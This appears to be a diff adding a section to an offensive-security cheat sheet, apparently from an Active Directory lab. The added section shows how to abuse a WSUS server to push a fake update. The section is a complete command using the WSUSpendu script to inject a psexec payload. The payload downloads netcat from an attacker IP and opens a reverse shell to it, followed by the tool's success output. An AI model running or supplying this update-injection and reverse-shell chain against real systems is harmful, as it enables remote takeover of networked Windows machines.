@@ -851,6 +851,16 @@ Microsoft Azure StorSimple                                          03421cec-205
 Microsoft Corporation                                               56309036-4c77-4dd9-951a-99ee9c246a94
 ```
 
+**[+] Abuse WSUS server**
+
+```powershell
+//Download this script, https://github.com/AlsidOfficial/WSUSpendu/blob/master/WSUSpendu.ps1
+
+[gcb-wsus.gcb.local]: PS C:\users\public> .\wsus.ps1 -Inject -PayloadFile .\psexec.exe -PayloadArgs '-accepteula -d cmd.exe /c "powershell invoke-webrequest http://192.168.100.14:8531/nc64.exe -outfile C:\users\public\nc.exe; c:\users\public\nc.exe 192.168.100.14 8530 -e cmd.exe"' -ComputerName vault-srv
+
+Everything seems ok. Wait for the client to take the update now...
+```
+
 &nbsp;
 &nbsp;
 
